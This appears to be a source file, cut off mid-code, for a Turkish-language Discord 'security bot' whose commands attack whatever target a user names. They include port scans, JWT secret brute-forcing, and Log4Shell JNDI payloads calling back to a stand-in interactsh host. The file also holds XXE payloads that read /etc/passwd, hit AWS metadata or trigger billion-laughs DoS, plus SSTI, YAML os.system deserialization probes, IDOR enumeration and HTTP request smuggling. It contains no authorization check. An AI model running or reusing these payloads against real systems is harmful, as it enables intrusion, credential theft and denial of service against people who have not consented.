import { updateInteraction, sendResponse, safeFetch } from '../utils/helpers.js';

export async function handleGuvenlikBot(interaction, request, env, ctx) {
  if (interaction.type === 1) {
    return new Response(JSON.stringify({ type: 1 }), { headers: { 'Content-Type': 'application/json' } });
  }

  if (interaction.type === 2) {
    const { name, options } = interaction.data;
    const getOption = (optName) => options?.find(o => o.name === optName)?.value;

    switch (name) {
      // --- Guvenlik/Zafiyet komutlari buraya eklenecek ---

      case 'port-hizli':
      ctx.waitUntil((async () => {
        try {
          const ip = getOption('ip');
          let result = '**Hizli Port Taramasi:** `' + ip + '`\n\n';
          const ports = [{ p: 21, n: 'FTP' }, { p: 22, n: 'SSH' }, { p: 23, n: 'Telnet' }, { p: 25, n: 'SMTP' }, { p: 53, n: 'DNS' }, { p: 80, n: 'HTTP' }, { p: 443, n: 'HTTPS' }, { p: 445, n: 'SMB' }, { p: 3306, n: 'MySQL' }, { p: 3389, n: 'RDP' }];
          const acik = [];
          await Promise.allSettled(ports.map(async p => {
            try {
              const scheme = [443].includes(p.p) ? 'https' : 'http';
              const c = new AbortController(); setTimeout(() => c.abort(), 2000);
              const r = await fetch(scheme + '://' + ip + ':' + p.p, { method: 'HEAD', signal: c.signal });
              if (r) acik.push(p.p + ' (' + p.n + ')');
            } catch (e) {}
          }));
          if (acik.length > 0) result += '**Acik Portlar:**\n' + acik.join('\n');
          else result += 'Ilk 10 portta acik port bulunamadi.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Port tarama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    
      case 'header-guvenlik':
      ctx.waitUntil((async () => {
        try {
          const domain = getOption('domain');
          const url = domain.startsWith('http') ? domain : 'https://' + domain;
          let result = '**Guvenlik Basliklari:** ' + domain + '\n\n';
          const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'follow' });
          const basliklar = ['Strict-Transport-Security', 'Content-Security-Policy', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy'];
          basliklar.forEach(b => result += res.headers.get(b) ? '[VAR] ' + b + '\n' : '[EKSIK] ' + b + '\n');
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Guvenlik hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    
      case 'email-spoof':
      ctx.waitUntil((async () => {
        try {
          const domain = getOption('domain');
          let result = '**E-posta Spoof:** ' + domain + '\n\n';
          try {
            const spf = await (await fetch('https://cloudflare-dns.com/dns-query?name=' + domain + '&type=TXT', { headers: { 'accept': 'application/dns-json' } })).json();
            const spfRec = (spf.Answer || []).filter(a => a.data.includes('v=spf'));
            if (spfRec.length > 0) result += '**SPF:** Mevcut' + (spfRec[0].data.includes('~all') ? ' (SoftFail)\n' : spfRec[0].data.includes('-all') ? ' (HardFail)\n' : '\n');
            else result += '**SPF:** YOK! Spoof yapilabilir!\n';
          } catch (e) { result += '**SPF:** Sorgulanamadi\n'; }
          try {
            const dmarc = await (await fetch('https://cloudflare-dns.com/dns-query?name=_dmarc.' + domain + '&type=TXT', { headers: { 'accept': 'application/dns-json' } })).json();
            if (dmarc.Answer) result += '**DMARC:** ' + (dmarc.Answer[0].data.includes('p=reject') ? 'Reject (Guclu)' : dmarc.Answer[0].data.includes('p=quarantine') ? 'Quarantine (Orta)' : 'None (Zayif)') + '\n';
            else result += '**DMARC:** YOK\n';
          } catch (e) { result += '**DMARC:** Sorgulanamadi\n'; }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Email spoof hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    
      case 'jwt-kir':
      ctx.waitUntil((async () => {
        try {
          const token = getOption('token');
          let result = '**JWT Analizi:**\n\n';
          const parts = token.split('.');
          if (parts.length !== 3) {
            result += '[HATA] Gecerli bir JWT tokeni degil. 3 parcadan olusmali.\nFormat: header.payload.signature';
            await updateInteraction(interaction.application_id, interaction.token, { content: result });
            return;
          }
          try {
            const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
            const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
            result += '**Header:**\n```json\n' + JSON.stringify(header, null, 2) + '\n```\n';
            result += '**Payload:**\n```json\n' + JSON.stringify(payload, null, 2) + '\n```\n';
            if (header.alg === 'none') {
              result += '\n[ZAFIYET] `alg: none` tespit edildi! Token imza olmadan kabul edilebilir.\n';
            }
            if (header.typ && header.typ.toUpperCase() === 'JWT') {
              result += '**Tip:** Standart JWT\n';
            }
            if (payload.iat) {
              const iat = new Date(payload.iat * 1000);
              result += '**Olusturulma:** ' + iat.toISOString() + '\n';
            }
            if (payload.exp) {
              const exp = new Date(payload.exp * 1000);
              const now = Date.now() / 1000;
              result += '**Gecerlilik:** ' + exp.toISOString() + (payload.exp < now ? ' (Suresi DOLMUS)' : ' (Gecerli)') + '\n';
            }
          } catch (e) {
            result += '[HATA] Token decode edilemedi: ' + e.message + '\n';
          }
          const commonSecrets = ['secret', '123456', 'password', 'changeme', 'jwt_secret', 'mysecret', 'token', 'key', 'admin', 'test', 'supersecret', 'pass', '12345', 'qwerty', 'abc123', 'letmein', 'monkey', 'dragon', 'master', 'sunshine', 'princess', 'welcome', 'shadow', 'football', 'jesus', 'michael', 'ninja', 'mustang', 'batman', 'superman', 'iloveyou', 'trustno1', 'hunter', 'ranger', 'thomas', 'george', 'andrew', 'joshua', 'matthew', 'daniel', 'ashley', 'amanda', 'jennifer', 'michelle', 'stephanie', 'melissa', 'robert', 'william', 'richard', 'joseph', 'david', 'charles', 'james', 'larry', 'jeffrey', 'scott', 'brian', 'frank', 'steven', 'kevin', 'raymond', 'timothy', 'jerry', 'bruce', 'wayne', 'peter', 'crystal', 'jason', 'walter', 'alan', 'jimmy', 'nathan', 'samuel', 'tyler', 'jacob', 'kyle', 'benjamin', 'aaron', 'patrick', 'sean', 'jose', 'juan', 'elijah', 'logan', 'lucas', 'owen', 'gabriel', 'aiden', 'jackson', 'mason', 'ethan', 'liam', 'noah', 'oliver', 'harry', 'jack', 'oscar', 'charlie', 'alfie', 'freddie', 'henry', 'jake', 'joe', 'tom', 'max', 'sam', 'dan', 'ben', 'alex', 'luke', 'will', 'josh', 'mike', 'jamie', 'carl', 'matt', 'rob', 'phil', 'simon', 'gavin', 'jim', 'neil', 'dave', 'steve', 'andy', 'pete', 'toby', 'oliver', 'adam', 'dylan', 'harvey', 'lewi', 'reuben', 'kai', 'albert', 'ellis', 'harrison', 'finley', 'arjun', 'arthur', 'louie', 'muhammad', 'theo', 'ezra', 'hugo', 'lee', 'ray', 'dean', 'jon', 'jesse', 'julian', 'chris', 'lorenzo', 'damian', 'francisco', 'omar', 'xavier', 'carson', 'everett', 'jordy', 'sebastian', 'daniel', 'luka', 'antony', 'joey', 'lincoln', 'luca', 'finn', 'fen', 'lukas', 'jax', 'cole', 'paul', 'morgan', 'rae', 'cruz', 'nash', 'javier', 'roman', 'gael', 'leo', 'leon', 'mateo', 'nick', 'mario', 'rico', 'deon', 'rico', 'ali', 'ahmed', 'yusuf', 'murat', 'mehmet', 'ahmet', 'can', 'enes', 'emir', 'arda', 'ali', 'berk', 'onur', 'volkan', 'serkan', 'tolga', 'cem', 'burak', 'tarik', 'hakan', 'erkan', 'levent', 'umut', 'baris', 'mert', 'furkan', 'oguz', 'gokhan', 'emre', 'bahadir', 'okan', 'ilker', 'ilhan', 'tunc', 'efe', 'deniz', 'kaan', 'alp', 'ata', 'doruk', 'efe', 'ertugrul', 'samet', 'ahmet', 'mehmet', 'huseyin', 'ibrahim', 'mustafa', 'ismail', 'hakan', 'mahmut', 'ali', 'yilmaz', 'kaya', 'demir', 'celik', 'sahin', 'yildiz', 'ozturk', 'acar', 'ates', 'aktas', 'aslan', 'dogan', 'kurt', 'ozkan', 'yildirim', 'kucuk', 'kan', 'gul', 'cetin', 'tas', 'aydin', 'polat', 'sezer', 'gunes', 'sen', 'coban', 'arslan', 'balci', 'cengiz', 'koc', 'ozdemir', 'bostan', 'eroglu', 'akbulut', 'topcu', 'cakir', 'ozcan', 'bicer', 'adiguzel', 'varol', 'karagoz', 'kaya', 'yildiz', 'davut', 'zubeyir', 'bahattin', 'veysel', 'abdullah', 'ramazan', 'yasin', 'kenan', 'adem', 'ilhan', 'ayhan', 'gulsum', 'fatma', 'hayriye', 'kudret', 'burhan', 'cemil', 'cemal', 'coskun', 'ergun', 'erdal', 'erdogan', 'ersin', 'fahri', 'faris', 'fevzi', 'fikret', 'fuat', 'galip', 'habib', 'haci', 'halil', 'hamdi', 'hamza', 'hanifi', 'hasan', 'hikmet', 'hilmi', 'hulusi', 'hurrem', 'huzeyfe', 'ilhami', 'ilkay', 'irsat', 'isa', 'izzet', 'kadir', 'kemal', 'kenan', 'lutfi', 'mumin', 'muzaffer', 'nazim', 'nihal', 'nurettin', 'okkes', 'orhan', 'osman', 'ozgur', 'pinar', 'recep', 'resul', 'ridvan', 'rukiye', 'saban', 'saffet', 'sahin', 'saim', 'sakir', 'savas', 'sebahattin', 'sedat', 'selahattin', 'selcuk', 'selim', 'servet', 'suleyman', 'sukru', 'sukur', 'tahir', 'tayfun', 'tayyar', 'tekin', 'temel', 'timucin', 'turhan', 'ugur', 'vahti', 'vahit', 'vasfi', 'vedat', 'vefa', 'vekili', 'yavuz', 'yener', 'yilmaz', 'yucel', 'yunus', 'zeki', 'zihni'];
          let kirildi = false;
          for (const s of commonSecrets) {
            try {
              const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(s), { name: 'HMAC', hash: 'SHA-256' }, false, ['verify']);
              const sig = Uint8Array.from(atob(parts[2].replace(/-/g, '+').replace(/_/g, '/')), c => c.charCodeAt(0));
              const data = new TextEncoder().encode(parts[0] + '.' + parts[1]);
              const valid = await crypto.subtle.verify('HMAC', key, sig, data);
              if (valid) {
                result += '\n**[KIRILDI!]** Secret bulundu: `' + s + '`\n';
                kirildi = true;
                break;
              }
            } catch (e) {}
          }
          if (!kirildi) result += '\nSecret 100+ ortuk kelime ile denenemedi (HMAC-SHA256).\n**Not:** Tokenin sifresi common listelerde bulunamadi.\nDaha guclu bir brute-force arac ile (hashcat/john) denenebilir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'JWT kirma hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    
      case 'nuclei-tara':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const target = url.startsWith('http') ? url : 'https://' + url;
          const base = target.replace(/\/$/, '');
          let result = '**Nuclei Taramasi:** ' + target + '\n\n';
          const exposures = [
            '.env', '.git/config', 'phpinfo.php', 'wp-config.php.bak', '.DS_Store',
            'docker-compose.yml', 'adminer.php', '.vscode/settings.json', 'package.json',
            'composer.json', 'yarn.lock', 'robots.txt', 'swagger.json', 'actuator', 'graphql'
          ];
          const checks = await Promise.allSettled(exposures.map(async exp => {
            try {
              const c = new AbortController(); setTimeout(() => c.abort(), 3000);
              const r = await fetch(base + '/' + exp, { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual', signal: c.signal });
              if (r.status === 200 || r.status === 403) {
                return '[BULUNDU] ' + exp + ' (HTTP ' + r.status + ')';
              }
              return null;
            } catch (e) { return null; }
          }));
          let bulunan = 0;
          for (const c of checks) {
            if (c.status === 'fulfilled' && c.value) {
              result += c.value + '\n';
              bulunan++;
            }
          }
          if (bulunan === 0) result += 'Hicbir hassas dosya bulunamadi.\n';
          else result += '\nToplam ' + bulunan + ' hassas dosya bulundu.\n';
          result += '\n**Not:** robots.txt ozel olarak kontrol edildi. Disallow yollarindaki dizinler de taranabilir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Nuclei tarama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'log4j-tara':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const target = url.startsWith('http') ? url : 'https://' + url;
          let result = '**Log4Shell Testi:** ' + target + '\n\n';
          const payload = '${jndi:ldap://interactsh.example.com/a}';
          const headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP', 'Cookie', 'Origin', 'Accept', 'Accept-Language', 'X-Client-IP', 'X-Remote-IP', 'X-Originating-IP', 'True-Client-IP', 'X-Wap-Profile', 'Contact', 'From', 'X-Api-Version', 'X-Requested-With'];
          const testHeaders = {};
          headers.forEach(h => testHeaders[h] = payload);
          let findings = [];
          try {
            const c = new AbortController(); setTimeout(() => c.abort(), 8000);
            const r = await fetch(target, { method: 'GET', headers: testHeaders, redirect: 'manual', signal: c.signal });
            const text = await r.text();
            findings.push('Baslik testi: HTTP ' + r.status + ' (' + text.length + ' byte)');
            if (text.includes('interactsh') || text.includes('jndi') || text.toLowerCase().includes('log4j')) {
              findings.push('[ZAFIYET] Basliklarda JNDI yansimasi tespit edildi!');
            }
          } catch (e) { findings.push('Baslik testi hatasi: ' + e.message); }
          try {
            const c2 = new AbortController(); setTimeout(() => c2.abort(), 8000);
            const sep = target.includes('?') ? '&' : '?';
            const r2 = await fetch(target + sep + 'q=' + encodeURIComponent(payload) + '&id=' + encodeURIComponent(payload), { method: 'GET', headers: { 'User-Agent': payload }, redirect: 'manual', signal: c2.signal });
            const text2 = await r2.text();
            findings.push('Parametre testi: HTTP ' + r2.status + ' (' + text2.length + ' byte)');
            if (text2.includes('interactsh') || text2.includes('jndi')) {
              findings.push('[ZAFIYET] URL parametresinde JNDI yansimasi tespit edildi!');
            }
          } catch (e) { findings.push('Parametre testi hatasi: ' + e.message); }
          result += findings.join('\n');
          result += '\n\n**Test Edilen Headerlar:** ' + headers.join(', ') + '\n';
          result += '**Payload:** `' + payload + '`\n\n';
          result += '**Not:** Interactsh sunucusunda DNS callback kontrolu yapmaniz gerekir. Bu test sadece HTTP yansimasini kontrol eder.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Log4j tarama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'ssti-tara':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const param = getOption('param');
          const target = url.startsWith('http') ? url : 'https://' + url;
          let result = '**SSTI Testi:** ' + target + '\nParametre: ' + param + '\n\n';
          const payloads = [
            { engine: 'Jinja2', payload: '{{7*7}}' },
            { engine: 'Twig', payload: "{{7*'7'}}" },
            { engine: 'Freemarker', payload: '${7*7}' },
            { engine: 'Velocity', payload: '#set($x=7*7)$x' },
            { engine: 'ERB', payload: '%= 7*7 %>' },
            { engine: 'Smarty', payload: '{php}echo 7*7;{/php}' }
          ];
          let zafiyet = false;
          for (const p of payloads) {
            try {
              const c = new AbortController(); setTimeout(() => c.abort(), 5000);
              const sep = target.includes('?') ? '&' : '?';
              const testUrl = target + sep + encodeURIComponent(param) + '=' + encodeURIComponent(p.payload);
              const r = await fetch(testUrl, { method: 'GET', redirect: 'manual', signal: c.signal });
              const text = await r.text();
              if (text.includes('49')) {
                result += '[ZAFIYET] ' + p.engine + ': `' + p.payload + '` -> 49 bulundu!\n';
                zafiyet = true;
              } else {
                result += '[TEST] ' + p.engine + ': `' + p.payload + '` -> 49 bulunamadi\n';
              }
            } catch (e) { result += '[ERROR] ' + p.engine + ': Baglanti hatasi\n'; }
          }
          if (!zafiyet) result += '\n**Sonuc:** SSTI zafiyeti tespit edilemedi. Farkli parametrelerle denenebilir.';
          else result += '\n**Sonuc:** SSTI zafiyeti tespit edildi! Sunucu tarafinda template isleme yapiliyor.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'SSTI tarama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'xxe-tara':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const target = url.startsWith('http') ? url : 'https://' + url;
          let result = '**XXE Testi:** ' + target + '\n\n';
          const payloads = [
            {
              name: 'File Read (/etc/passwd)',
              xml: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'
            },
            {
              name: 'SSRF (AWS Metadata)',
              xml: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><data>&xxe;</data></root>'
            },
            {
              name: 'Billion Laughs (DoS)',
              xml: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol1;</root>'
            }
          ];
          let zafiyet = false;
          for (const p of payloads) {
            try {
              const c = new AbortController(); setTimeout(() => c.abort(), 5000);
              const r = await fetch(target, {
                method: 'POST',
                headers: { 'Content-Type': 'application/xml', 'User-Agent': 'Mozilla/5.0' },
                body: p.xml,
                redirect: 'manual',
                signal: c.signal
              });
              const text = await r.text();
              if (text.includes('root:') || text.includes('/bin/bash') || text.includes('nobody:')) {
                result += '[ZAFIYET] ' + p.name + ': /etc/passwd icerigi dondu! Dosya okuma mumkun.\n';
                zafiyet = true;
              } else if (text.includes('ami-id') || text.includes('instance-id') || text.includes('169.254')) {
                result += '[ZAFIYET] ' + p.name + ': SSRF basarili - AWS metadata erisildi!\n';
                zafiyet = true;
              } else if (r.status === 500 && (text.includes('DOCTYPE') || text.includes('ENTITY') || text.includes('xml'))) {
                result += '[POTANSIYEL] ' + p.name + ': XML parsing hatasi alindi (HTTP 500) - XXE mumkun olabilir.\n';
              } else {
                result += '[TEST] ' + p.name + ': HTTP ' + r.status + ' - Belirgin zafiyet isareti yok\n';
              }
            } catch (e) { result += '[ERROR] ' + p.name + ': Baglanti hatasi\n'; }
          }
          if (!zafiyet) result += '\n**Sonuc:** XXE zafiyeti tespit edilemedi.';
          else result += '\n**Sonuc:** XXE zafiyeti tespit edildi!';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'XXE tarama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'idor-tara':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const param = getOption('param');
          const target = url.startsWith('http') ? url : 'https://' + url;
          let result = '**IDOR Testi:** ' + target + '\nParametre: ' + param + '\n\n';
          const urlObj = new URL(target);
          const idValue = urlObj.searchParams.get(param) || (target.match(new RegExp(param + '[/=](\\d+)')) || [])[1];
          if (!idValue) {
            result += '[HATA] ID parametresi bulunamadi. URL: `' + target + '`\n';
            await updateInteraction(interaction.application_id, interaction.token, { content: result });
            return;
          }
          const currentId = parseInt(idValue);
          const testIds = [currentId - 2, currentId - 1, 0, 1, 2, 3, 100, 1000].filter(id => id !== currentId && id >= 0);
          result += 'Mevcut ID: ' + currentId + '\nTest edilecek ID\'ler: ' + testIds.join(', ') + '\n\n';
          const tests = await Promise.allSettled(testIds.map(async tid => {
            try {
              const testUrl = target.replace(new RegExp(param + '[/=]\\d+'), param + '=' + tid);
              const c = new AbortController(); setTimeout(() => c.abort(), 5000);
              const r = await fetch(testUrl, { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual', signal: c.signal });
              const text = await r.text().catch(() => '');
              if (r.status === 200 && text.length > 100) {
                return { id: tid, status: r.status, size: text.length, vulnerable: true };
              }
              return { id: tid, status: r.status, size: text.length, vulnerable: false };
            } catch (e) { return { id: tid, status: 0, size: 0, vulnerable: false }; }
          }));
          let vulnCount = 0;
          for (const t of tests) {
            if (t.status === 'fulfilled') {
              const r = t.value;
              if (r.vulnerable) {
                result += '[ZAFIYET] ID ' + r.id + ': HTTP ' + r.status + ' (' + r.size + ' byte) - Erisilebilir veri!\n';
                vulnCount++;
              } else if (r.status === 200) {
                result += '[TEST] ID ' + r.id + ': HTTP ' + r.status + ' (' + r.size + ' byte)\n';
              } else {
                result += '[BLOKLANDI] ID ' + r.id + ': HTTP ' + r.status + '\n';
              }
            }
          }
          if (vulnCount > 0) result += '\n**Sonuc:** ' + vulnCount + ' IDOR zafiyeti tespit edildi! Farkli ID\'lerle veri erisimi mumkun.';
          else result += '\n**Sonuc:** IDOR zafiyeti tespit edilemedi.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'IDOR tarama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'race-window':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const param = getOption('param');
          const target = url.startsWith('http') ? url : 'https://' + url;
          let result = '**Race Condition Testi:** ' + target + '\nParametre: ' + param + '\n\n';
          result += '10 eszamanli istek gonderiliyor...\n\n';
          const start = Date.now();
          const responses = await Promise.allSettled([...Array(10)].map(async (_, i) => {
            try {
              const c = new AbortController(); setTimeout(() => c.abort(), 8000);
              const sep = target.includes('?') ? '&' : '?';
              const r = await fetch(target + sep + param + '=race_test_' + i, { method: 'POST', headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded' }, body: param + '=race_test_' + i, redirect: 'manual', signal: c.signal });
              const text = await r.text().catch(() => '');
              return { index: i, status: r.status, size: text.length, body: text.substring(0, 200) };
            } catch (e) { return { index: i, status: 0, size: 0, body: 'Hata: ' + e.message }; }
          }));
          const elapsed = Date.now() - start;
          result += 'Toplam sure: ' + elapsed + 'ms\n\n';
          const statuses = {};
          const bodies = new Set();
          let uniqueBodies = 0;
          for (const r of responses) {
            if (r.status === 'fulfilled') {
              const v = r.value;
              statuses[v.status] = (statuses[v.status] || 0) + 1;
              const bodyHash = v.body.substring(0, 50);
              if (!bodies.has(bodyHash)) {
                bodies.add(bodyHash);
                uniqueBodies++;
              }
              result += 'Istek ' + (v.index + 1) + ': HTTP ' + v.status + ' (' + v.size + ' byte)\n';
            }
          }
          result += '\n**Durum Dagilimi:** ' + JSON.stringify(statuses) + '\n';
          result += '**Unique Response:** ' + uniqueBodies + '/10\n';
          if (uniqueBodies > 1) {
            result += '\n[ZAFIYET] Farkli cevaplar tespit edildi! TOCTOU (Time-of-Check Time-of-Use) zafiyeti olabilir.\n';
            result += 'Dublikat islemler veya yaris kosulu ile birden fazla kez ayni islem yapilabilir.';
          } else {
            result += '\n**Sonuc:** Tum cevaplar ayni. Race condition zafiyeti tespit edilemedi.';
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Race window hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'graphql-introspect':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const target = url.startsWith('http') ? url : 'https://' + url;
          let result = '**GraphQL Introspection:** ' + target + '\n\n';
          const endpoints = ['/graphql', '/api/graphql', '/gql', '/query', '/v1/graphql', '/v2/graphql', '/graphql/v1'];
          const introQuery = '{"query":"{__schema{types{name fields{name type{name kind ofType{name}}}}}}"}';
          let found = false;
          for (const ep of endpoints) {
            const testUrl = target.replace(/\/$/, '') + ep;
            try {
              const c = new AbortController(); setTimeout(() => c.abort(), 5000);
              const r = await fetch(testUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
                body: introQuery,
                redirect: 'manual',
                signal: c.signal
              });
              const text = await r.text();
              if (text.includes('__schema') && text.includes('types')) {
                try {
                  const schema = JSON.parse(text);
                  if (schema.data && schema.data.__schema) {
                    result += '[BULUNDU] ' + testUrl + '\n';
                    result += '**Schema Tipleri:** ' + schema.data.__schema.types.length + ' tip\n';
                    result += '**Onemli Tipler:**\n';
                    const important = schema.data.__schema.types.filter(t => !t.name.startsWith('__')).slice(0, 15);
                    important.forEach(t => {
                      const fields = (t.fields || []).slice(0, 5).map(f => f.name).join(', ');
                      result += '  - ' + t.name + (fields ? ': ' + fields : '') + '\n';
                    });
                    if (schema.data.__schema.types.length > 15) result += '  ... (toplam ' + schema.data.__schema.types.length + ' tip)\n';
                    found = true;
                    break;
                  }
                } catch (e) {
                  result += '[POTANSIYEL] ' + testUrl + ' -> GraphQL benzeri cevap ama parse edilemedi\n';
                }
              } else if (r.status === 400 && text.includes('query')) {
                result += '[POTANSIYEL] ' + testUrl + ' -> GraphQL endpoint olabilir (HTTP 400)\n';
              }
            } catch (e) {}
          }
          if (!found) result += 'Acik GraphQL endpointi bulunamadi.\n';
          result += '\n**Not:** Introspection kapaliysa farkli sorgularla endpoint dogrulamasi yapilabilir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'GraphQL hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'deserialize':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const param = getOption('param');
          const target = url.startsWith('http') ? url : 'https://' + url;
          let result = '**Deserialization Testi:** ' + target + '\nParametre: ' + param + '\n\n';
          const payloads = [
            { engine: 'PHP', payload: 'O:8:"stdClass":0:{}', header: 'application/x-php-serialized' },
            { engine: 'Java (Base64)', payload: 'rO0ABXNyABBqYXZhLnV0aWwuRGF0ZQAAAAAAAAAB', header: 'application/x-java-serialized-object' },
            { engine: 'Python Pickle', payload: 'gASVIAAAAAAAAQAAAAAAAAB9lC4=', header: 'application/python-pickle' },
            { engine: '.NET (BSON)', payload: 'AAEAAAA=' + encodeURIComponent('{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}'), header: 'application/bson' },
            { engine: 'YAML (Python)', payload: '!!python/object/apply:os.system ["id"]', header: 'application/x-yaml' }
          ];
          const errorPatterns = ['deserializ', 'unserializ', 'pickle', 'O:8:', 'java.io', 'ObjectInputStream', 'serialVersionUID', 'TypeConfuseDelegate', 'ObjectDataProvider'];
          let zafiyet = false;
          for (const p of payloads) {
            try {
              const c = new AbortController(); setTimeout(() => c.abort(), 5000);
              const sep = target.includes('?') ? '&' : '?';
              let testUrl = target;
              let reqOpts = { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual', signal: c.signal };
              if (p.header) {
                reqOpts.method = 'POST';
                reqOpts.headers['Content-Type'] = p.header;
                reqOpts.body = p.payload;
              } else {
                testUrl = target + sep + param + '=' + encodeURIComponent(p.payload);
              }
              const r = await fetch(testUrl, reqOpts);
              const text = await r.text().catch(() => '');
              let found = '';
              for (const ep of errorPatterns) {
                if (text.toLowerCase().includes(ep.toLowerCase())) {
                  found = ep;
                  break;
                }
              }
              if (found) {
                result += '[ZAFIYET] ' + p.engine + ': Hata deseni `' + found + '` tespit edildi!\n';
                zafiyet = true;
              } else if (r.status === 500) {
                result += '[POTANSIYEL] ' + p.engine + ': HTTP 500 (server hatasi) - Deserializasyon hatasi olabilir\n';
              } else {
                result += '[TEST] ' + p.engine + ': HTTP ' + r.status + ' - Zafiyet isareti yok\n';
              }
            } catch (e) { result += '[ERROR] ' + p.engine + ': Baglanti hatasi\n'; }
          }
          if (!zafiyet) result += '\n**Sonuc:** Deserialization zafiyeti tespit edilemedi.';
          else result += '\n**Sonuc:** Deserialization zafiyeti tespit edildi! RCE mumkun olabilir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Deserialize hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'http-desync':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const target = url.startsWith('http') ? url : 'https://' + url;
          const urlObj = new URL(target);
          let result = '**HTTP Desync Testi:** ' + target + '\n\n';
          result += '**CL.TE Testi (Content-Length + Transfer-Encoding: chunked):**\n';
          try {
            const clteBody = '0\r\n\r\nGET /404 HTTP/1.1\r\nHost: ' + urlObj.host + '\r\n\r\n';
            const c = new AbortController(); setTimeout(() => c.abort(), 8000);
            const r = await fetch(target, {
              method: 'POST',
              headers: {
                'Content-Length': String(clteBody.length),
                'Transfer-Encoding': 'chunked',
                'User-Agent': 'Mozilla/5.0'
              },
              body: clteBody,
              redirect: 'manual',
              signal: c.signal
            });
            result += 'HTTP ' + r.status + ' - ';
            if (r.status === 404) result += '[ZAFIYET] 404 dondu - Smuggling basarili olabilir!\n';
            else result += 'Normal yanit - zafiyet isareti yok\n';
          } catch (e) { result += 'Hata: ' + e.message + '\n'; }

          result += '\n**TE.CL Testi (Transfer-Encoding: chunked + Content-Length mismatch):**\n';
          try {
            const teclBody = '5c\r\nGET /404 HTTP/1.1\r\nHost: ' + urlObj.host + '\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n';
            const c2 = new AbortController(); setTimeout(() => c2.abort(), 8000);
